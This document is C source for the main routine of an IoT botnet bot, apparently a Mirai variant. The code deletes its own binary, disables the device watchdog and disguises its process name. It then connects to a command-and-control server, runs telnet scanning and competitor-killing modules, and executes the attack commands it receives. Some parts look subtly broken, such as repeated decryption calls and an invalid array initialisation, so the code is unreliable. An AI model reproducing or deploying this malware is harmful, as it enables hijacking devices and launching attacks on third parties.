#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"
#include "resolv.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf((char*)util_decrypt((char*)util_decrypt("\x47\x6F\x74\x20\x53\x49\x47\x53\x45\x47\x56\x20\x61\x74\x20\x61\x64\x64\x72\x65\x73\x73\x3A\x20\x30\x78\x25\x6C\x78\x0A\x00", 31), 31), (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

int main(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    int wfd;

    // Delete self
    unlink(args[0]);

    // Signal based control flow
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, &anti_gdb_entry);

    // Prevent watchdog from rebooting device
    if ((wfd = open((char*)util_decrypt((char*)util_decrypt("\x2F\x64\x65\x76\x2F\x77\x61\x74\x63\x68\x64\x6F\x67\x00", 14), 14), 2)) != -1 ||
        (wfd = open((char*)util_decrypt((char*)util_decrypt("\x2F\x64\x65\x76\x2F\x6D\x69\x73\x63\x2F\x77\x61\x74\x63\x68\x64\x6F\x67\x00", 19), 19), 2)) != -1)
    {
        int one = 1;

        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
    chdir((char*)util_decrypt((char*)util_decrypt("\x2F\x00", 2), 2));
#endif

#ifdef DEBUG
    printf((char*)util_decrypt((char*)util_decrypt("\x44\x45\x42\x55\x47\x20\x4D\x4F\x44\x45\x20\x59\x4F\x0A\x00", 15), 15));

    sleep(1);

    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror((char*)util_decrypt((char*)util_decrypt("\x73\x69\x67\x61\x63\x74\x69\x6F\x6E\x00", 10), 10));

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror((char*)util_decrypt((char*)util_decrypt("\x73\x69\x67\x61\x63\x74\x69\x6F\x6E\x00", 10), 10));
#endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

#ifdef DEBUG
    unlock_tbl_if_nodebug(args[0]);
    anti_gdb_entry(0);
#else
    if (unlock_tbl_if_nodebug(args[0]))
        raise(SIGTRAP);
#endif

    ensure_single_instance();

    rand_init();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    // Hide argv0
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    // Hide process name
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    // Print out system exec
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, (char*)util_decrypt((char*)util_decrypt("\x0A\x00", 2), 2), 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();
    killer_init();
#ifndef DEBUG
#ifdef MIRAI_TELNET
    scanner_init();
#endif
#endif

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf((char*)util_decrypt((char*)util_decrypt("\x73\x65\x6C\x65\x63\x74\x28\x29\x20\x65\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x0A\x00", 21), 21), errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x44\x65\x74\x65\x63\x74\x65\x64\x20\x6E\x65\x77\x65\x72\x20\x69\x6E\x73\x74\x61\x6E\x63\x65\x20\x72\x75\x6E\x6E\x69\x6E\x67\x21\x20\x4B\x69\x6C\x6C\x69\x6E\x67\x20\x73\x65\x6C\x66\x0A\x00", 54), 54));
#endif
#ifdef MIRAI_TELNET
            scanner_kill();
#endif
            killer_kill();
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x54\x69\x6D\x65\x64\x20\x6F\x75\x74\x20\x77\x68\x69\x6C\x65\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6E\x67\x20\x74\x6F\x20\x43\x4E\x43\x0A\x00", 42), 42));
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x45\x72\x72\x6F\x72\x20\x77\x68\x69\x6C\x65\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6E\x67\x20\x74\x6F\x20\x43\x4E\x43\x20\x63\x6F\x64\x65\x3D\x25\x64\x0A\x00", 46), 46), err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, (char*)util_decrypt("\x0A\x0A\x0A\x0B", 4), 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG
                    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x43\x6F\x6E\x6E\x65\x63\x74\x65\x64\x20\x74\x6F\x20\x43\x4E\x43\x2E\x20\x4C\x6F\x63\x61\x6C\x20\x61\x64\x64\x72\x65\x73\x73\x20\x3D\x20\x25\x64\x0A\x00", 45), 45), LOCAL_ADDR);
#endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0; // Cause connection to close
            }
            
            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x4C\x6F\x73\x74\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x77\x69\x74\x68\x20\x43\x4E\x43\x20\x28\x65\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x29\x20\x31\x0A\x00", 48), 48), errno);
#endif
                teardown_connection();
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x4C\x6F\x73\x74\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x77\x69\x74\x68\x20\x43\x4E\x43\x20\x28\x65\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x29\x20\x32\x0A\x00", 48), 48), errno);
#endif
                teardown_connection();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x52\x65\x63\x65\x69\x76\x65\x64\x20\x25\x64\x20\x62\x79\x74\x65\x73\x20\x66\x72\x6F\x6D\x20\x43\x4E\x43\x0A\x00", 35), 35), len);
#endif

            if (len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
#ifdef DEBUG
        printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x72\x65\x73\x6F\x6C\x76\x65\x20\x43\x4E\x43\x20\x61\x64\x64\x72\x65\x73\x73\x0A\x00", 38), 38));
#endif
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG
    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x52\x65\x73\x6F\x6C\x76\x65\x64\x20\x64\x6F\x6D\x61\x69\x6E\x0A\x00", 24), 24));
#endif
}

static void establish_connection(void)
{
#ifdef DEBUG
    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x41\x74\x74\x65\x6D\x70\x74\x69\x6E\x67\x20\x74\x6F\x20\x63\x6F\x6E\x6E\x65\x63\x74\x20\x74\x6F\x20\x43\x4E\x43\x0A\x00", 37), 37));
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x63\x61\x6C\x6C\x20\x73\x6F\x63\x6B\x65\x74\x28\x29\x2E\x20\x45\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x0A\x00", 44), 44), errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Should call resolve_cnc_addr
    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}

static void teardown_connection(void)
{
#ifdef DEBUG
    printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x54\x65\x61\x72\x69\x6E\x67\x20\x64\x6F\x77\x6E\x20\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x20\x74\x6F\x20\x43\x4E\x43\x21\x0A\x00", 40), 40));
#endif

    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x41\x6E\x6F\x74\x68\x65\x72\x20\x69\x6E\x73\x74\x61\x6E\x63\x65\x20\x69\x73\x20\x61\x6C\x72\x65\x61\x64\x79\x20\x72\x75\x6E\x6E\x69\x6E\x67\x20\x28\x65\x72\x72\x6E\x6F\x20\x3D\x20\x25\x64\x29\x21\x20\x53\x65\x6E\x64\x69\x6E\x67\x20\x6B\x69\x6C\x6C\x20\x72\x65\x71\x75\x65\x73\x74\x2E\x2E\x2E\x0D\x0A\x00", 83), 83), errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x63\x6F\x6E\x6E\x65\x63\x74\x20\x74\x6F\x20\x66\x64\x5F\x63\x74\x72\x6C\x20\x74\x6F\x20\x72\x65\x71\x75\x65\x73\x74\x20\x70\x72\x6F\x63\x65\x73\x73\x20\x74\x65\x72\x6D\x69\x6E\x61\x74\x69\x6F\x6E\x0A\x00", 68), 68));
#endif
        }
        
        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x63\x61\x6C\x6C\x20\x6C\x69\x73\x74\x65\x6E\x28\x29\x20\x6F\x6E\x20\x66\x64\x5F\x63\x74\x72\x6C\x0A\x00", 43), 43));
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
#ifdef DEBUG
        printf((char*)util_decrypt((char*)util_decrypt("\x5B\x6D\x61\x69\x6E\x5D\x20\x57\x65\x20\x61\x72\x65\x20\x74\x68\x65\x20\x6F\x6E\x6C\x79\x20\x70\x72\x6F\x63\x65\x73\x73\x20\x6F\x6E\x20\x74\x68\x69\x73\x20\x73\x79\x73\x74\x65\x6D\x21\x0A\x00", 48), 48));
#endif
    }
}

static BOOL unlock_tbl_if_nodebug(char *argv0)
{
    // ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
    char buf_src[18] = (char*)util_decrypt("\x25\x24\x0A\x7C\x6E\x0A\x42\x78\x0A\x66\x6F\x0A\x6F\x7A\x0A\x0A\x78\x0A", 18), buf_dst[12];
    int i, ii = 0, c = 0;
    uint8_t fold = 0xAF;
    void (*obf_funcs[]) (void) = {
        (void (*) (void))ensure_single_instance,
        (void (*) (void))table_unlock_val,
        (void (*) (void))table_retrieve_val,
        (void (*) (void))table_init, // This is the function we actually want to run
        (void (*) (void))table_lock_val,
        (void (*) (void))util_memcpy,
        (void (*) (void))util_strcmp,
        (void (*) (void))killer_init,
        (void (*) (void))anti_gdb_entry
    };
    BOOL matches;

    for (i = 0; i < 7; i++)
        c += (long)obf_funcs[i];
    if (c == 0)
        return FALSE;

    // We swap every 2 bytes: e.g. 1, 2, 3, 4 -> 2, 1, 4, 3
    for (i = 0; i < sizeof (buf_src); i += 3)
    {
        char tmp = buf_src[i];

        buf_dst[ii++] = buf_src[i + 1];
        buf_dst[ii++] = tmp;

        // Meaningless tautology that gets you right back where you started
        i *= 2;
        i += 14;
        i /= 2;
        i -= 7;

        // Mess with 0xAF
        fold += ~argv0[ii % util_strlen(argv0)];
    }
    fold %= (sizeof (obf_funcs) / sizeof (void *));
    
#ifndef DEBUG
    (obf_funcs[fold])();
    matches = util_strcmp(argv0, buf_dst);
    util_zero(buf_src, sizeof (buf_src));
    util_zero(buf_dst, sizeof (buf_dst));
    return matches;
#else
    table_init();
    return TRUE;
#endif
}
